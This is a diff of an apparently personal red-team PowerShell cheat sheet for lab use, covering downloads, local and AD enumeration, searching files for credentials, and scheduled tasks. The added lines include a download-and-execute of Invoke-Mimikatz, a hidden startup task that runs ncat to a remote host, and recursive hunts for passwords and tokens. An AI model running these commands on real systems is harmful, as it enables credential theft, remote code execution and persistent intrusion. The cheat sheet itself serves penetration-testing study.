@@ -1,21 +1,28 @@
 ---
-edit: Need to update and edit
+title: Windows PowerShell Reference
+tags: [windows, powershell, enumeration, persistence, red-team]
+tools: [powershell, Invoke-WebRequest, Get-ChildItem, Get-LocalUser, Get-Service, Select-String, Get-ADUser, schtasks]
 ---
 
-# Windows powershell commands
+# Windows PowerShell Reference
 
-## Web
+## Web / Download
 
 ```powershell
-# curl -I alternative
-Invoke-WebRequest -Uri "https://website-to-visit" -Method GET
+# HTTP GET (headers + body)
+Invoke-WebRequest -Uri "https://example.com" -Method GET
 
-# wget alternative
-Invoke-WebRequest -Uri "https://website-to-visit\file.ps1" -OutFile "C:\<filename>"
+# Download a file (wget alternative)
+Invoke-WebRequest -Uri "https://example.com/tools.zip" -OutFile "C:\Temp\tools.zip"
 
-# Using .NET
-(New-Object
-Net.WebClient).DownloadFile("https://website-to-visit\tools.zip", "Tools.zip")
+# Download using .NET WebClient
+(New-Object Net.WebClient).DownloadFile("https://example.com/tools.zip", "C:\Temp\tools.zip")
+
+# Save and execute a remote script (be careful!)
+Invoke-WebRequest -Uri "https://example.com/script.ps1" -OutFile "$env:TEMP\script.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\script.ps1"
+
+# Execute a remote script Alt
+IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.1.30/Invoke-Mimikatz.ps1')
 ```
 
 ## Enumeration
@@ -23,78 +30,82 @@ Net.WebClient).DownloadFile("https://website-to-visit\tools.zip", "Tools.zip")
 ```powershell
 # Local users and groups
 Get-LocalUser
-get-localgroup
+Get-LocalGroup
+Get-LocalGroupMember -Group "Administrators"
 
-# Random
-Get-LocalUser administrator | get-member
-Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled
+# Inspect a single user
+Get-LocalUser -Name "Administrator" | Get-Member
 
-# AD users
+# Active Directory (requires RSAT / domain access)
 Get-ADUser -Filter *
 
 # Services
-Get-Service | Select-Object -Property *
-Get-Service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | 
-Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *
+Get-Service | Select-Object DisplayName, Name, Status | Sort-Object DisplayName
+Get-Service | Where-Object {$_.DisplayName -like '*Defender*'}
+Get-Service -ComputerName ACADEMY-ICL-DC
 
-# Remote query of a hosts services
-Get-service -ComputerName ACADEMY-ICL-DC
+# Processes
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
 ```
 
-## Loot folders
+## Loot folders & history
 
 ```powershell
-# Show hidden
+# Show hidden files in current folder
 Get-ChildItem -Hidden
 
-# Administrator and interesting files
-# Admin console history
-C:\Users<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+# PSReadLine console history path
 Get-Content (Get-PSReadlineOption).HistorySavePath
 
-# dont forget to check
-\AppData\
+# Common paths to check for secrets
+$paths = @(
+  "$env:USERPROFILE\AppData\Roaming",
+  "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell",
+  "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
+)
+$paths
 ```
 
-## Searching for loot
+## Searching for loot (grep-like)
 
 ```powershell
-# Count number of files
-(Get-ChildItem -File -Recurse | Measure-Object).Count
+# Count files under a path
+(Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
 
-# Search rec for a specific file
-Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+# Find files by name pattern (recursive)
+Get-ChildItem -Path N:\ -Include '*cred*' -File -Recurse -ErrorAction SilentlyContinue
 
-# Grep like
-Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
-N:\Contracts\private\secret.txt:1:file with all credentials
-N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
+# Search file contents for keywords (fast)
+Get-ChildItem -Path N:\ -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password','credential','key' -List
 
-# Searcha dir and for a file type
-Get-ChildItem -Path /home/jon/ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}
+# Combined: limit types and search for secrets
+Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.txt','.ps1','.py','.md','.csv' } | Select-String -Pattern 'password','credential','key','token' -List
 
-Get-ChildItem -Path /home/jon/ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
-
-# Look for passwords in file types, like grep
-Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"
-
-# Combined
-Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"
-
+# Example output interpretation
+# N:\Contracts\private\secret.txt:1:file with all credentials
+# N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
 ```
 
-## Sheduled tasks
+## Scheduled Tasks (creation / modification)
 
 ```powershell
-# Allows for the creation of scheduled tasks
-schtasks /create
+# Create a scheduled task via schtasks (Powershell wrapper)
+schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command \"Start-Process cmd.exe -ArgumentList '/c C:\\Temp\\ncat.exe 172.16.1.100 8100' -NoNewWindow\""
 
-schtasks /create /sc <Schedule Frequency> /tn <TaskName> /tr <ProgramPath>
+# Modify task account / password
+schtasks /change /tn "My Secret Task" /ru Administrator /rp "P@ssw0rd"
 
-# Modification of an existing scheduled task
-schtasks /change /tn <Task Name> /ru <Username> /rp <Password>
+# Delete a task
+schtasks /delete /tn "My Secret Task" /f
 
-# Delete
-schtasks /delete /tn <Task Name>
+# List tasks (verbose)
+schtasks /query /v /fo list
 ```
 
+## Quick Notes
+
+- Use `Select-String` (alias `sls`) instead of `findstr` for richer PowerShell output objects.
+- `Get-ChildItem` + `Select-String` returns objects you can further filter, export, or parse.
+- AD enumeration requires appropriate privileges and RSAT modules.
+- Downloading and executing remote scripts is common in labs but treat as high risk on real systems.
+- Use `-ErrorAction SilentlyContinue` on recursive searches to avoid noisy permission errors.
